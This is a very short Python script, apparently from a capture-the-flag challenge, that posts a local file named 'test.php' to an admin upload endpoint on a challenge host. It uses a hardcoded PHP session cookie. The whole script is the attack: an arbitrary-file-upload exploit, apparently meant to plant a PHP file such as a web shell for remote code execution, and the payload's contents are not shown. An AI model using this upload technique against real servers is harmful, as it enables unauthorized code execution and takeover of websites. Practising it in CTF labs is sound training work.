import requests

if __name__ == '__main__':
    print(requests.post('http://573934a8-0a05-4839-918c-cd5936a23c90.node.ccut.club:8080/admin/?a=call&m=upLoad',files={'file':open('test.php','r')},cookies={'PHPSESSID':'2rh63nm0timgus20kqm2sdd0g2'}).text)